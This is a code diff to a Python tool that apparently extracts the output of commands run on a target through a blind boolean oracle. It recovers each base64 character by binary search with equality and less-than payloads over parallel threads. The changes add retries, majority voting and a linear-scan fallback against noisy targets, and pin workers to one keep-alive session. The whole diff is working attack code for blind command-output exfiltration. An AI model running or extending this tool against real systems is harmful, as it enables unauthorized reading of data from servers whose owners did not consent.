@@ -1,7 +1,6 @@
 import base64
 import time
 import concurrent.futures
-import os
 from rich.console import Console
 from rich.progress import Progress, TextColumn, BarColumn, TaskProgressColumn, TimeRemainingColumn
 
@@ -45,33 +44,82 @@ def find_output_length(cmd, strategy, max_retries=3):
     console.print(f"[bold red]Warning: Could not determine exact length even with bound {right}[/]")
     return right  # Return the last attempted bound
 
+def _send_with_retry(strategy, payload, timeout, max_retries=5):
+    """Send a payload, retrying on None (transient error). Returns True/False, or raises on exhaustion."""
+    for attempt in range(max_retries):
+        result = strategy.send_payload(payload, timeout)
+        if result is not None:
+            return result
+        wait = 0.5 * (attempt + 1)
+        time.sleep(wait)
+    raise RuntimeError(f"Request failed after {max_retries} retries")
+
+def _majority_vote_request(strategy, payload, timeout, attempts=3):
+    """Return a stable boolean decision by majority vote across repeated queries."""
+    true_count = 0
+    false_count = 0
+    for _ in range(attempts):
+        result = _send_with_retry(strategy, payload, timeout)
+        if result:
+            true_count += 1
+        else:
+            false_count += 1
+    return true_count >= false_count
+
+def _recover_character_by_scan(position, cmd, strategy, timeout):
+    """
+    Fallback for noisy targets: linearly scan valid base64 chars and use majority vote
+    on equality checks to recover a character when binary search gets contradictory answers.
+    """
+    for char_value in _BASE64_CHARS:
+        payload = strategy.create_char_check_payload(cmd, position, char_value)
+        is_equal = _majority_vote_request(strategy, payload, timeout, attempts=3)
+        if is_equal:
+            return chr(char_value)
+    return None
+
+# All valid base64 characters sorted by ASCII value:
+# A-Z (65-90), a-z (97-122), 0-9 (48-57), + (43), / (47), = (61, padding)
+_BASE64_CHARS = sorted(
+    list(range(65, 91)) +   # A-Z
+    list(range(97, 123)) +  # a-z
+    list(range(48, 58)) +   # 0-9
+    [43, 47, 61]            # + / =
+)
+
 def binary_search_character(task):
     """Perform binary search to find the character at a specific position"""
     position, cmd, strategy, timeout = task
-    left, right = 43, 122  # ASCII range for base64 characters
-    
+    chars = _BASE64_CHARS
+    left, right = 0, len(chars) - 1  # index-based search over valid base64 chars only
+
     while left <= right:
-        mid = (left + right) // 2
-        
-        # Check if character is equal to mid
+        mid_idx = (left + right) // 2
+        mid = chars[mid_idx]
+
+        # Check if character equals mid — retry on transient errors
         payload = strategy.create_char_check_payload(cmd, position, mid)
-        is_equal = strategy.send_payload(payload, timeout)
-        
+        is_equal = _send_with_retry(strategy, payload, timeout)
+
         if is_equal:
             return chr(mid)
-        
-        # Check if character is less than mid
-        payload = strategy.create_char_less_than_payload(cmd, position, mid)
-        is_less = strategy.send_payload(payload, timeout)
-        
-        if is_less:
-            right = mid - 1
-        else:
-            left = mid + 1
-    
-    return None  # Character not found
 
-def read_output_parallel(cmd, strategy, max_workers=10, timeout=5, batch_size=None, debug_mode=False):
+        # Check if character is less than mid — retry on transient errors
+        payload = strategy.create_char_less_than_payload(cmd, position, mid)
+        is_less = _send_with_retry(strategy, payload, timeout)
+
+        if is_less:
+            # char <= mid, and we know char != mid, so char < mid
+            right = mid_idx - 1
+        else:
+            # char > mid
+            left = mid_idx + 1
+
+    # If binary search exhausted, responses were likely noisy/contradictory.
+    # Use a robust fallback before giving up on the position.
+    return _recover_character_by_scan(position, cmd, strategy, timeout)
+
+def read_output_parallel(cmd, strategy, max_workers=10, timeout=1, batch_size=None, debug_mode=False):
     """Extract output using parallel binary search"""
     # First determine the length of the output
     length = find_output_length(cmd, strategy)
@@ -80,9 +128,10 @@ def read_output_parallel(cmd, strategy, max_workers=10, timeout=5, batch_size=No
         console.print("[bold red]Could not determine output length, aborting[/]")
         return ""
     
-    # Check if running in Cursor/Electron environment
-    in_electron = 'ELECTRON_RUN_AS_NODE' in os.environ
-    executor_class = concurrent.futures.ThreadPoolExecutor if in_electron else concurrent.futures.ProcessPoolExecutor
+    # Always use threads so all workers share the same strategy session object
+    # (ProcessPoolExecutor would pickle the strategy into each subprocess, creating
+    # separate sessions and separate TCP connections, defeating keep-alive pinning)
+    executor_class = concurrent.futures.ThreadPoolExecutor
     
     result = [""] * length
     remaining_positions = list(range(length))
@@ -118,15 +167,23 @@ def read_output_parallel(cmd, strategy, max_workers=10, timeout=5, batch_size=No
                     try:
                         console.print(f"[bold cyan]DEBUG:[/] Processing position {position}")
                         char = binary_search_character(task_data)
+                        # Always remove from remaining (None means failed/not found — don't retry forever)
+                        remaining_positions.remove(position)
                         if char:
                             result[position] = char
-                            remaining_positions.remove(position)
-                            
-                            # Update progress
-                            partial = ''.join(c if c else '?' for c in result)
-                            progress.update(task, advance=1, current=partial[-40:] if len(partial) > 40 else partial)
                             console.print(f"[bold cyan]DEBUG:[/] Position {position} = '{char}'")
+                        else:
+                            result[position] = '?'
+                            console.print(f"[bold yellow]DEBUG:[/] Position {position} = not found, marking as '?'")
+                        # Update progress
+                        partial = ''.join(c if c else '?' for c in result)
+                        progress.update(task, advance=1, current=partial[-40:] if len(partial) > 40 else partial)
                     except Exception as e:
+                        # Retries exhausted — remove position so we don't loop forever
+                        remaining_positions.remove(position)
+                        result[position] = '?'
+                        partial = ''.join(c if c else '?' for c in result)
+                        progress.update(task, advance=1, current=partial[-40:] if len(partial) > 40 else partial)
                         console.print(f"[bold red]Error processing position {position}:[/] {str(e)}")
             else:
                 # Use the appropriate executor based on environment
@@ -137,14 +194,22 @@ def read_output_parallel(cmd, strategy, max_workers=10, timeout=5, batch_size=No
                         position = futures[future]
                         try:
                             char = future.result()
+                            # Always remove from remaining (None means failed — don't retry forever)
+                            remaining_positions.remove(position)
                             if char:
                                 result[position] = char
-                                remaining_positions.remove(position)
-                                
-                                # Update progress
-                                partial = ''.join(c if c else '?' for c in result)
-                                progress.update(task, advance=1, current=partial[-40:] if len(partial) > 40 else partial)
+                            else:
+                                result[position] = '?'
+                                console.print(f"[bold yellow]Warning:[/] Position {position} not found, marking as '?'")
+                            # Update progress
+                            partial = ''.join(c if c else '?' for c in result)
+                            progress.update(task, advance=1, current=partial[-40:] if len(partial) > 40 else partial)
                         except Exception as e:
+                            # Retries exhausted — remove position so we don't loop forever
+                            remaining_positions.remove(position)
+                            result[position] = '?'
+                            partial = ''.join(c if c else '?' for c in result)
+                            progress.update(task, advance=1, current=partial[-40:] if len(partial) > 40 else partial)
                             console.print(f"[bold red]Error processing position {position}:[/] {str(e)}")
     
     # Join all characters and decode
